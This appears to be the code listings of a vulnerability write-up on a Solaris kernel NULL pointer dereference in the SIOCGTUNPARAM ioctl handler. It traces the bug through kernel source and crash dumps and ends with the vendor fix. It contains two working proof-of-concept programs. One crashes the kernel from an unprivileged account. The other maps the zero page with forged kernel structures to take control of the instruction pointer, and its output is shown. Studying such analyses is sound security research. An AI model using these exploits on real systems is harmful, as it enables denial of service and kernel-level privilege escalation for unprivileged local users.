["```\nsolaris$ `pwd`\n/exports/home/tk/on-src/usr/src/uts\n\nsolaris$ `grep -rnw -e _IOR -e _IOW -e _IOWR *`\n[..]\ncommon/sys/sockio.h:208:#define SIOCTONLINK     _IOWR('i', 145, struct sioc_addr req)\ncommon/sys/sockio.h:210:#define SIOCTMYSITE     _IOWR('i', 146, struct sioc_addr req)\ncommon/sys/sockio.h:213:#define SIOCGTUNPARAM   _IOR('i',  147, struct iftun_req)\ncommon/sys/sockio.h:216:#define SIOCSTUNPARAM   _IOW('i',  148, struct iftun_req)\ncommon/sys/sockio.h:220:#define SIOCFIPSECONFIG _IOW('i',  149, 0) /* Flush Policy  */\ncommon/sys/sockio.h:221:#define SIOCSIPSECONFIG _IOW('i',  150, 0) /* Set Policy */\ncommon/sys/sockio.h:222:#define SIOCDIPSECONFIG _IOW('i',  151, 0) /* Delete Policy */\ncommon/sys/sockio.h:223:#define SIOCLIPSECONFIG _IOW('i',  152, 0) /* List Policy */\n[..]\n```", "```\nsolaris$ `grep --include=*.c -rn SIOCTONLINK *`\ncommon/inet/ip/ip.c:1267:    /* 145 */ { SIOCTONLINK,\n sizeof (struct sioc_add rreq), → IPI_GET_CMD,\n```", "```\n[..]\n367    /*\n368     * Message block descriptor\n369     */\n370    typedef struct        msgb {\n371        struct    msgb    *b_next;\n372        struct    msgb    *b_prev;\n373        struct    msgb    *b_cont;\n`374        unsigned char     *b_rptr;`\n`375        unsigned char     *b_wptr;`\n`376        struct datab      *b_datap;`\n377        unsigned char     b_band;\n378        unsigned char     b_tag;\n379        unsigned short    b_flag;\n380        queue_t           *b_queue;    /* for sync queues */\n`381    } mblk_t;`\n[..]\n```", "```\n[..]\n26692    void\n26693    ip_process_ioctl(ipsq_t *ipsq, queue_t *q, mblk_t *mp, void *arg)\n26694    {\n[..]\n`26717        ci.ci_ipif = NULL;`\n[..]\n`26735        case TUN_CMD:`\n26736            /*\n26737             * SIOC[GS]TUNPARAM appear here. ip_extract_tunreq returns\n26738             * a refheld ipif in ci.ci_ipif\n26739             */\n`26740            err = ip_extract_tunreq(q, mp, &ci.ci_ipif, ip_process_ioctl);`\n[..]\n```", "```\n[..]\n8158    /*\n8159     * Parse an iftun_req structure coming down SIOC[GS]TUNPARAM ioctls,\n8160     * refhold and return the associated ipif\n8161     */\n8162    /* ARGSUSED */\n8163    int\n8164    ip_extract_tunreq(queue_t *q, `mblk_t *mp`, const ip_ioctl_cmd_t *ipip,\n8165        cmd_info_t *ci, ipsq_func_t func)\n8166    {\n8167        boolean_t exists;\n`8168        struct iftun_req *ta;`\n8169        ipif_t     *ipif;\n8170        ill_t      *ill;\n8171        boolean_t  isv6;\n8172        mblk_t     *mp1;\n8173        int        error;\n8174        conn_t     *connp;\n8175        ip_stack_t *ipst;\n8176\n8177        /* Existence verified in ip_wput_nondata */\n`8178        mp1 = mp->b_cont->b_cont;`\n`8179        ta = (struct iftun_req *)mp1->b_rptr;`\n8180        /*\n8181         * Null terminate the string to protect against buffer\n8182         * overrun. String was generated by user code and may not\n8183         * be trusted.\n8184         */\n8185       ta->ifta_lifr_name[LIFNAMSIZ - 1] = '\\0';\n8186\n8187       connp = Q_TO_CONN(q);\n8188       isv6 = connp->conn_af_isv6;\n8189       ipst = connp->conn_netstack->netstack_ip;\n8190\n8191       /* Disallows implicit create */\n`8192       ipif = ipif_lookup_on_name(ta->ifta_lifr_name,`\n`8193           mi_strlen(ta->ifta_lifr_name), B_FALSE, &exists, isv6,`\n`8194           connp->conn_zoneid, CONNP_TO_WQ(connp), mp, func, &error, ipst);`\n[..]\n```", "```\n[..]\n19116    /*\n19117     * Find an IPIF based on the name passed in.  Names can be of the\n19118     * form <phys> (e.g., le0), <phys>:<#> (e.g., le0:1),\n19119     * The <phys> string can have forms like <dev><#> (e.g., le0),\n19120     * <dev><#>.<module> (e.g. le0.foo), or <dev>.<module><#> (e.g. ip.tun3).\n19121     * When there is no colon, the implied unit id is zero. <phys> must\n19122     * correspond to the name of an ILL.  (May be called as writer.)\n19123     */\n19124    static ipif_t *\n19125    ipif_lookup_on_name(`char *name`, size_t namelen, boolean_t do_alloc,\n19126        boolean_t *exists, boolean_t isv6, zoneid_t zoneid, queue_t *q,\n19127        mblk_t *mp, ipsq_func_t func, int *error, ip_stack_t *ipst)\n19128    {\n[..]\n19138       if (error != NULL)\n`19139           *error = 0;`\n[..]\n`19154       /* Look for a colon in the name. */`\n`19155       endp = &name[namelen];`\n`19156       for (cp = endp; --cp > name; ) {`\n`19157           if (*cp == IPIF_SEPARATOR_CHAR)`\n`19158               break;`\n`19159       }`\n19160\n`19161       if (*cp == IPIF_SEPARATOR_CHAR) {`\n19162           /*\n19163            * Reject any non-decimal aliases for logical\n19164            * interfaces. Aliases with leading zeroes\n19165            * are also rejected as they introduce ambiguity\n19166            * in the naming of the interfaces.\n19167            * In order to confirm with existing semantics,\n19168            * and to not break any programs/script relying\n19169            * on that behaviour, if<0>:0 is considered to be\n19170            * a valid interface.\n19171            *\n19172            * If alias has two or more digits and the first\n19173            * is zero, fail.\n19174            */\n`19175           if (&cp[2] < endp && cp[1] == '0')`\n`19176               return (NULL);`\n19177       }\n[..]\n```", "```\n[..]\n8192    ipif = ipif_lookup_on_name(ta->ifta_lifr_name,\n8193        mi_strlen(ta->ifta_lifr_name), B_FALSE, &exists, isv6,\n8194        connp->conn_zoneid, CONNP_TO_WQ(connp), mp, func, &error, ipst);\n8195    if (ipif == NULL)\n8196        return (error);\n[..]\n```", "```\n[..]\n`26717   ci.ci_ipif = NULL;`\n[..]\n26735     case TUN_CMD:\n26736         /*\n26737          * SIOC[GS]TUNPARAM appear here. ip_extract_tunreq returns\n26738          * a refheld ipif in ci.ci_ipif\n26739          */\n`26740         err = ip_extract_tunreq(q, mp, &ci.ci_ipif, ip_process_ioctl);`\n`26741         if (err != 0) {`\n26742             ip_ioctl_finish(q, mp, err, IPI2MODE(ipip), NULL);\n26743             return;\n26744         }\n[..]\n`26788         err = (*ipip->ipi_func)(ci.ci_ipif, ci.ci_sin, q, mp, ipip,`\n`26789             ci.ci_lifr);`\n[..]\n```", "```\n[..]\n9401    int\n9402    ip_sioctl_tunparam(`ipif_t *ipif`, sin_t *dummy_sin, queue_t *q, mblk_t *mp,\n9403        ip_ioctl_cmd_t *ipip, void *dummy_ifreq)\n9404    {\n[..]\n`9432        ill = ipif->ipif_ill;`\n[..]\n```", "```\n[..]\n19124    static ipif_t *\n19125    ipif_lookup_on_name(char *name, size_t namelen, boolean_t do_alloc,\n19126        boolean_t *exists, boolean_t isv6, zoneid_t zoneid, queue_t *q,\n19127        mblk_t *mp, ipsq_func_t func, int *error, ip_stack_t *ipst)\n19128    {\n[..]\n19138       if (error != NULL)\n`19139           *error = 0;`\n[..]\n19161       if (*cp == IPIF_SEPARATOR_CHAR) {\n19162           /*\n19163            * Reject any non-decimal aliases for logical\n19164            * interfaces. Aliases with leading zeroes\n19165            * are also rejected as they introduce ambiguity\n19166            * in the naming of the interfaces.\n19167            * In order to confirm with existing semantics,\n19168            * and to not break any programs/script relying\n19169            * on that behaviour, if<0>:0 is considered to be\n19170            * a valid interface.\n19171            *\n19172            * If alias has two or more digits and the first\n19173            * is zero, fail.\n19174            */\n`19175           if (&cp[2] < endp && cp[1] == '0')`\n`19176               return (NULL);`\n19177       }\n[..]\n```", "```\n[..]\n8192    ipif = ipif_lookup_on_name(ta->ifta_lifr_name,\n8193        mi_strlen(ta->ifta_lifr_name), B_FALSE, &exists, isv6,\n8194        connp->conn_zoneid, CONNP_TO_WQ(connp), mp, func, `&error`, ipst);\n8195    if (ipif == NULL)\n`8196        return (error);`\n[..]\n```", "```\n[..]\n26735     case TUN_CMD:\n26736         /*\n26737          * SIOC[GS]TUNPARAM appear here. ip_extract_tunreq returns\n26738          * a refheld ipif in ci.ci_ipif\n26739          */\n`26740         err = ip_extract_tunreq(q, mp, &ci.ci_ipif, ip_process_ioctl);`\n`26741         if (err != 0) {`\n26742             ip_ioctl_finish(q, mp, err, IPI2MODE(ipip), NULL);\n26743             return;\n26744         }\n[..]\n`26788         err = (*ipip->ipi_func)(ci.ci_ipif, ci.ci_sin, q, mp, ipip,`\n`26789             ci.ci_lifr);`\n[..]\n```", "```\n01    #include <stdio.h>\n02    #include <fcntl.h>\n03    #include <sys/syscall.h>\n04    #include <errno.h>\n05    #include <sys/sockio.h>\n06    #include <net/if.h>\n07\n08    int\n09    main (void)\n10    {\n11           int       fd  = 0;\n12           char      data[32];\n13\n14           fd = open (\"/dev/arp\", O_RDWR);\n15\n16           if (fd < 0) {\n17                   perror (\"open\");\n18                   return 1;\n19           }\n20\n21           // IOCTL data (interface name with invalid alias \":01\")\n22           data[0] = 0x3a; // colon\n23           data[1] = 0x30; // ASCII zero\n24           data[2] = 0x31; // digit 1\n25           data[3] = 0x00; // NULL termination\n26\n27           // IOCTL call\n28           syscall (SYS_ioctl, fd, SIOCGTUNPARAM, data);\n29\n30           printf (\"poc failed\\n\");\n31           close (fd);\n32\n33           return 0;\n34    }\n```", "```\nsolaris$ `isainfo -b`\n64\n\nsolaris$ `id`\nuid=100(wwwuser) gid=1(other)\n\nsolaris$ `uname -a`\nSunOS bob 5.10 Generic_137138-09 i86pc i386 i86pc\n\nsolaris$ `/usr/sfw/bin/gcc -m64 -o poc poc.c`\n\nsolaris$ `./poc`\n```", "```\nsolaris# `id`\nuid=0(root) gid=0(root)\n\nsolaris# `hostname`\nbob\n\nsolaris# `cd /var/crash/bob/`\n\nsolaris# `ls`\nbounds    unix.0    vmcore.0\n\nsolaris# `mdb unix.0 vmcore.0`\nLoading modules: [ unix krtld genunix specfs dtrace cpu.generic\n uppc pcplusmp ufs ip hook neti sctp arp usba fcp fctl nca lofs mpt zfs\n random sppp audiosup nfs ptm md cpc crypto fcip logindmux ]\n```", "```\n> `::msgbuf`\n[..]\npanic[cpu0]/thread=ffffffff87d143a0:\nBAD TRAP: type=e (#pf Page fault) rp=fffffe8000f7e5a0 addr=8\n occurred in module \"ip\" due to a `NULL pointer dereference`\n\npoc:\n#pf Page fault\nBad kernel fault at addr=0x8\npid=1380, pc=0xfffffffff6314c7c, sp=0xfffffe8000f7e690, eflags=0x10282\ncr0: 80050033<pg,wp,ne,et,mp,pe> cr4: 6b0<xmme,fxsr,pge,pae,pse>\ncr2: 8 cr3: 21a2a000 cr8: c\n        rdi:                0 rsi: ffffffff86bc0700 rdx: ffffffff86bc09c8\n        rcx:                0  r8: fffffffffbd0fdf8  r9: fffffe8000f7e780\n        rax:                c rbx: ffffffff883ff200 rbp: fffffe8000f7e6d0\n        r10:                1 r11:                0 r12: ffffffff8661f380\n        `r13:                0` r14: ffffffff8661f380 r15: ffffffff819f5b40\n        fsb: fffffd7fff220200 gsb: fffffffffbc27fc0  ds:                0\n         es:                0  fs:              1bb  gs:                0\n        trp:                e err:                0 `rip: fffffffff6314c7c`\n         cs:               28 rfl:            10282 rsp: fffffe8000f7e690\n         ss:               30\n\nfffffe8000f7e4b0 unix:die+da ()\nfffffe8000f7e590 unix:trap+5e6 ()\nfffffe8000f7e5a0 unix:_cmntrap+140 ()\n`fffffe8000f7e6d0 ip:ip_sioctl_tunparam+5c ()`\nfffffe8000f7e780 ip:ip_process_ioctl+280 ()\nfffffe8000f7e820 ip:ip_wput_nondata+970 ()\nfffffe8000f7e910 ip:ip_output_options+537 ()\nfffffe8000f7e920 ip:ip_output+10 ()\nfffffe8000f7e940 ip:ip_wput+37 ()\nfffffe8000f7e9a0 unix:putnext+1f1 ()\nfffffe8000f7e9d0 arp:ar_wput+9d ()\nfffffe8000f7ea30 unix:putnext+1f1 ()\nfffffe8000f7eab0 genunix:strdoioctl+67b ()\nfffffe8000f7edd0 genunix:strioctl+620 ()\nfffffe8000f7edf0 specfs:spec_ioctl+67 ()\nfffffe8000f7ee20 genunix:fop_ioctl+25 ()\nfffffe8000f7ef00 genunix:ioctl+ac ()\nfffffe8000f7ef10 unix:brand_sys_syscall+21d ()\n\nsyncing file systems...\n done\ndumping to /dev/dsk/c0d0s1, offset 107413504, content: kernel\n```", "```\n> `0xfffffffff6314c7c::dis`\nip_sioctl_tunparam+0x30:        jg     +0xf0    <ip_sioctl_tunparam+0x120>\nip_sioctl_tunparam+0x36:        movq   0x28(%r12),%rax\nip_sioctl_tunparam+0x3b:        movq   0x28(%rbx),%rbx\nip_sioctl_tunparam+0x3f:        movq   %r12,%rdi\nip_sioctl_tunparam+0x42:        movb   $0xe,0x19(%rax)\nip_sioctl_tunparam+0x46:        call   +0x5712cfa       <copymsg>\nip_sioctl_tunparam+0x4b:        movq   %rax,%r15\nip_sioctl_tunparam+0x4e:        movl   $0xc,%eax\nip_sioctl_tunparam+0x53:        testq  %r15,%r15\nip_sioctl_tunparam+0x56:        je     +0x9d    <ip_sioctl_tunparam+0xf3>\n`ip_sioctl_tunparam+0x5c:        movq   0x8(%r13),%r14`\n[..]\n```", "```\n[..]\n9401    int\n9402    ip_sioctl_tunparam(ipif_t *ipif, sin_t *dummy_sin, queue_t *q, mblk_t *mp,\n9403        ip_ioctl_cmd_t *ipip, void *dummy_ifreq)\n9404    {\n[..]\n`9432        ill = ipif->ipif_ill;`\n[..]\n```", "```\n[..]\n9401    int\n9402    ip_sioctl_tunparam(ipif_t *ipif, sin_t *dummy_sin, queue_t *q, mblk_t *mp,\n9403        ip_ioctl_cmd_t *ipip, void *dummy_ifreq)\n9404    {\n[..]\n`9432        ill = ipif->ipif_ill;`\n9433        mutex_enter(&connp->conn_lock);\n9434        mutex_enter(&ill->ill_lock);\n9435        if (ipip->ipi_cmd == SIOCSTUNPARAM || ipip->ipi_cmd == OSIOCSTUNPARAM) {\n9436            success = ipsq_pending_mp_add(connp, ipif, CONNP_TO_WQ(connp),\n9437                mp, 0);\n9438        } else {\n9439            success = ill_pending_mp_add(ill, connp, mp);\n9440        }\n9441        mutex_exit(&ill->ill_lock);\n9442        mutex_exit(&connp->conn_lock);\n9443\n9444        if (success) {\n9445            ip1dbg((\"sending down tunparam request \"));\n`9446            putnext(ill->ill_wq, mp1);`\n[..]\n```", "```\n[..]\n146    void\n`147    putnext(queue_t *qp, mblk_t *mp)`\n148    {\n[..]\n`154        int        (*putproc)();`\n[..]\n`176        qp = qp->q_next;`\n`177        sq = qp->q_syncq;`\n178        ASSERT(sq != NULL);\n179        ASSERT(MUTEX_NOT_HELD(SQLOCK(sq)));\n`180        qi = qp->q_qinfo;`\n[..]\n268        /*\n269         * We now have a claim on the syncq, we are either going to\n270         * put the message on the syncq and then drain it, or we are\n271         * going to call the putproc().\n272         */\n`273        putproc = qi->qi_putp;`\n274        if (!queued) {\n275            STR_FTEVENT_MSG(mp, fqp, FTEV_PUTNEXT, mp->b_rptr -\n276                mp->b_datap->db_base);\n`277            (*putproc)(qp, mp);`\n[..]\n```", "```\n01    #include <string.h>\n 02    #include <stdio.h>\n 03    #include <unistd.h>\n 04    #include <fcntl.h>\n 05    #include <sys/syscall.h>\n 06    #include <sys/sockio.h>\n 07    #include <net/if.h>\n 08    #include <sys/mman.h>\n 09\n 10    ////////////////////////////////////////////////\n 11    // Map the zero page and fill it with the\n 12    // necessary data\n 13    int\n 14    map_null_page (void)\n 15    {\n 16      void *  mem = (void *)-1;\n 17\n 18      // map the zero page\n 19      mem = mmap (NULL, PAGESIZE, PROT_EXEC|PROT_READ|PROT_WRITE,\n 20                  MAP_FIXED|MAP_PRIVATE|MAP_ANON, −1, 0);\n 21\n 22      if (mem != NULL) {\n 23        printf (\"failed\\n\");\n 24        fflush (0);\n 25        perror (\"[-] ERROR: mmap\");\n 26        return 1;\n 27      }\n 28\n 29      // fill the zero page with zeros\n 30      memset (mem, 0x00, PAGESIZE);\n 31\n 32      ////////////////////////////////////////////////\n 33      // zero page data\n 34\n 35      // qi->qi_putp\n 36      *(unsigned long long *)0x00 = 0x0000000041414141;\n 37\n 38      // ipif->ipif_ill\n 39      *(unsigned long long *)0x08 = 0x0000000000000010;\n 40\n 41      // start of ill struct (ill->ill_ptr)\n 42      *(unsigned long long *)0x10 = 0x0000000000000000;\n 43\n 44      // ill->rq\n 45      *(unsigned long long *)0x18 = 0x0000000000000000;\n 46\n 47      // ill->wq (sets address for qp struct)\n 48      *(unsigned long long *)0x20 = 0x0000000000000028;\n 49\n 50      // start of qp struct (qp->q_info)\n 51      *(unsigned long long *)0x28 = 0x0000000000000000;\n 52\n 53      // qp->q_first\n 54      *(unsigned long long *)0x30 = 0x0000000000000000;\n 55\n 56      // qp->q_last\n 57      *(unsigned long long *)0x38 = 0x0000000000000000;\n 58\n 59      // qp->q_next (points to the start of qp struct)\n 60      *(unsigned long long *)0x40 = 0x0000000000000028;\n 61\n 62      // qp->q_syncq\n 63      *(unsigned long long *)0xa0 = 0x00000000000007d0;\n 64\n 65      return 0;\n 66    }\n 67\n 68    void\n 69    status (void)\n 70    {\n 71      unsigned long long  i = 0;\n 72\n 73      printf (\"[+] PAGESIZE: %d\\n\", (int)PAGESIZE);\n 74      printf (\"[+] Zero page data:\\n\");\n 75\n 76      for (i = 0; i <= 0x40; i += 0x8)\n 77        printf (\"... 0x%02x: 0x%016llx\\n\", i, *(unsigned long long*)i);\n 78\n 79      printf (\"... 0xa0: 0x%016llx\\n\", *(unsigned long long*)0xa0);\n 80\n 81      printf (\"[+] The bug will be triggered in 2 seconds..\\n\");\n 82\n 83      fflush (0);\n 84    }\n 85\n 86    int\n 87    main (void)\n 88    {\n 89      int   fd  = 0;\n 90      char  data[32];\n 91\n 92      ////////////////////////////////////////////////\n 93      // Opening the '/dev/arp' device\n 94      printf (\"[+] Opening '/dev/arp' device .. \");\n 95\n 96      fd = open (\"/dev/arp\", O_RDWR);\n 97\n 98      if (fd < 0) {\n 99        printf (\"failed\\n\");\n100        fflush (0);\n101        perror (\"[-] ERROR: open\");\n102        return 1;\n103      }\n104\n105      printf (\"OK\\n\");\n106\n107      ////////////////////////////////////////////////\n108      // Map the zero page\n109      printf (\"[+] Trying to map zero page .. \");\n110\n111      if (map_null_page () == 1) {\n112        return 1;\n113      }\n114\n115      printf (\"OK\\n\");\n116\n117      ////////////////////////////////////////////////\n118      // Status messages\n119      status ();\n120      sleep (2);\n121\n122      ////////////////////////////////////////////////\n123      // IOCTL request data (interface name with invalid alias ':01')\n124      data[0] = 0x3a; // colon\n125      data[1] = 0x30; // ASCII zero\n126      data[2] = 0x31; // the digit '1'\n127      data[3] = 0x00; // NULL termination\n128\n129      ////////////////////////////////////////////////\n130      // IOCTL request\n131      syscall (SYS_ioctl, fd, SIOCGTUNPARAM, data);\n132\n133      printf (\"[-] ERROR: triggering the NULL ptr deref failed\\n\");\n134      close (fd);\n135\n136      return 0;\n137    }\n```", "```\nsolaris$ `isainfo -b`\n64\n\nsolaris$ `id`\nuid=100(wwwuser) gid=1(other)\n\nsolaris$ `zonename`\nwwwzone\n\nsolaris$ `ppriv -S $$`\n1422:   -bash\nflags = <none>\n        E: basic\n        I: basic\n        P: basic\n        L: zone\n\nsolaris$ `/usr/sfw/bin/gcc -m64 -o poc2 poc2.c`\n\nsolaris$ `./poc2`\n[+] Opening '/dev/arp' device .. OK\n[+] Trying to map zero page .. OK\n[+] PAGESIZE: 4096\n[+] Zero page data:\n... 0x00: 0x0000000041414141\n... 0x08: 0x0000000000000010\n... 0x10: 0x0000000000000000\n... 0x18: 0x0000000000000000\n... 0x20: 0x0000000000000028\n... 0x28: 0x0000000000000000\n... 0x30: 0x0000000000000000\n... 0x38: 0x0000000000000000\n... 0x40: 0x0000000000000028\n... 0xa0: 0x00000000000007d0\n[+] The bug will be triggered in 2 seconds..\n```", "```\nsolaris# `id`\nuid=0(root) gid=0(root)\n\nsolaris# `hostname`\nbob\n\nsolaris# `cd /var/crash/bob/`\n\nsolaris# `ls`\nbounds    unix.0    vmcore.0    unix.1    vmcore.1\n\nsolaris# `mdb unix.1 vmcore.1`\nLoading modules: [ unix krtld genunix specfs dtrace cpu.generic uppc\n pcplusmp ufs ip hook neti sctp arp usba fcp fctl nca lofs mpt zfs\n audiosup md cpc random crypto fcip logindmux ptm sppp nfs ]\n\n> `::msgbuf`\n[..]\npanic[cpu0]/thread=ffffffff8816c120:\nBAD TRAP: type=e (#pf Page fault) rp=fffffe800029f530\n `addr=41414141` occurred in module\n \"<unknown>\" due to an illegal access to a user address\n\npoc2:\n#pf Page fault\n`Bad kernel fault at addr=0x41414141`\npid=1404, `pc=0x41414141`, sp=0xfffffe800029f628, eflags=0x10246\ncr0: 80050033<pg,wp,ne,et,mp,pe> cr4: 6b0<xmme,fxsr,pge,pae,pse>\ncr2: 41414141 cr3: 1782a000 cr8: c\n        rdi:               28 rsi: ffffffff81700380 rdx: ffffffff8816c120\n        rcx:                0  r8:                0  r9:                0\n        rax:                0 rbx:                0 rbp: fffffe800029f680\n        r10:                1 r11:                0 r12:              7d0\n        r13:               28 r14: ffffffff81700380 r15:                0\n        fsb: fffffd7fff220200 gsb: fffffffffbc27fc0  ds:                0\n         es:                0  fs:              1bb  gs:                0\n        trp:                e err:               10 `rip:         41414141`\n         cs:               28 rfl:            10246 rsp: fffffe800029f628\n         ss:               30\n\nfffffe800029f440 unix:die+da ()\nfffffe800029f520 unix:trap+5e6 ()\nfffffe800029f530 unix:_cmntrap+140 ()\n`fffffe800029f680 41414141 ()`\nfffffe800029f6d0 ip:ip_sioctl_tunparam+ee ()\nfffffe800029f780 ip:ip_process_ioctl+280 ()\nfffffe800029f820 ip:ip_wput_nondata+970 ()\nfffffe800029f910 ip:ip_output_options+537 ()\nfffffe800029f920 ip:ip_output+10 ()\nfffffe800029f940 ip:ip_wput+37 ()\nfffffe800029f9a0 unix:putnext+1f1 ()\nfffffe800029f9d0 arp:ar_wput+9d ()\nfffffe800029fa30 unix:putnext+1f1 ()\nfffffe800029fab0 genunix:strdoioctl+67b ()\nfffffe800029fdd0 genunix:strioctl+620 ()\nfffffe800029fdf0 specfs:spec_ioctl+67 ()\nfffffe800029fe20 genunix:fop_ioctl+25 ()\nfffffe800029ff00 genunix:ioctl+ac ()\nfffffe800029ff10 unix:brand_sys_syscall+21d ()\n\nsyncing file systems...\n done\ndumping to /dev/dsk/c0d0s1, offset 107413504, content: kernel\n\n`> $c`\n`0x41414141()`\nip_sioctl_tunparam+0xee()\nip_process_ioctl+0x280()\nip_wput_nondata+0x970()\nip_output_options+0x537()\nip_output+0x10()\nip_wput+0x37()\nputnext+0x1f1()\nar_wput+0x9d()\nputnext+0x1f1()\nstrdoioctl+0x67b()\nstrioctl+0x620()\nspec_ioctl+0x67()\nfop_ioctl+0x25()\nioctl+0xac()\nsys_syscall+0x17b()\n```", "```\n[..]\n19165    if (*cp == IPIF_SEPARATOR_CHAR) {\n19166        /*\n19167         * Reject any non-decimal aliases for logical\n19168         * interfaces. Aliases with leading zeroes\n19169         * are also rejected as they introduce ambiguity\n19170         * in the naming of the interfaces.\n19171         * In order to confirm with existing semantics,\n19172         * and to not break any programs/script relying\n19173         * on that behaviour, if<0>:0 is considered to be\n19174         * a valid interface.\n19175         *\n19176         * If alias has two or more digits and the first\n19177         * is zero, fail.\n19178         */\n19179        if (&cp[2] < endp && cp[1] == '0') {\n`19180            if (error != NULL)`\n`19181                *error = EINVAL;`\n19182            return (NULL);\n19183        }\n[..]\n```"]